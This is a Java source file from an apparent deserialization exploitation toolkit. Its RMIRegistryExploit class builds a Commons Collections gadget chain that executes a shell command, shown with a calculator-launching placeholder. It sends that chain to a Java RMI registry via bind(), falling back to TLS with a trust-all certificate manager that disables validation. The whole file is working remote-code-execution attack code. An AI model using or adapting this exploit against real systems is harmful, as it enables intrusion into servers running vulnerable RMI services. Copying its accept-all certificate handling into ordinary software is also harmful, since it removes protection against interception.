package com.ppp.exploit;


import com.ppp.*;
import com.ppp.chain.commonscollections3.CommonsCollections1;
import com.ppp.chain.commonscollections4.CommonsCollections2;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.IOException;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;

/**
 * -> registry
 */
@Exploit
public class RMIRegistryExploit implements ExploitPayload {
    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClass = CommonsCollections2.class;
        ObjectPayload objectPayload = gadgetClass.newInstance();

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setCommand("open -a Calculator.app");
        sinksHelper.setSink(gadgetClass.getAnnotation(Sink.class).value()[0]);
        Object gadget = objectPayload.getObject(sinksHelper);

        ExploitHelper exploitHelper = new ExploitHelper();
        exploitHelper.setHost("127.0.0.1");
        exploitHelper.setPort(Integer.parseInt("1099"));

        ExploitBuilder.run(ExploitBuilder.getExploitClass("RMIRegistryExploit"), gadget, exploitHelper);
    }

    @Override
    public void exploit(Object gadget, ExploitHelper exploitHelper) {
        try {
            String host = exploitHelper.getHost();
            int port = exploitHelper.getPort();
            Registry registry = createRegistry(host, port);
            String name = RanDomUtils.generateRandomOnlyString(4, 8);
            Printer.yellowInfo("Exploit send to " + host + ":" + port + " with name " + name);

            Remote remote = KickOff.createMemoitizedProxy(KickOff.createMap(name, gadget), Remote.class);
            registry.bind(name, remote);
            Printer.yellowInfo("Exploit send success");
        } catch (Throwable e) {
            Printer.warn(e.getMessage());
        }
    }

    private static class TrustAllSSL implements X509TrustManager {
        private static final X509Certificate[] ANY_CA = {};

        public X509Certificate[] getAcceptedIssuers() {
            return ANY_CA;
        }

        public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }

        public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
    }

    private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
        public Socket createSocket(String host, int port) throws IOException {
            try {
                SSLContext ctx = SSLContext.getInstance("TLS");
                ctx.init(null, new TrustManager[]{new TrustAllSSL()}, null);
                SSLSocketFactory factory = ctx.getSocketFactory();
                return factory.createSocket(host, port);
            } catch (Exception e) {
                throw new IOException(e);
            }
        }
    }

    public static Registry createRegistry(String host, int port) throws RemoteException {
        Registry registry = LocateRegistry.getRegistry(host, port);

        // test RMI registry connection and upgrade to SSL connection on fail
        try {
            registry.list();
        } catch (ConnectIOException ex) {
            registry = LocateRegistry.getRegistry(host, port, new RMISSLClientSocketFactory());
        }

        return registry;
    }

}
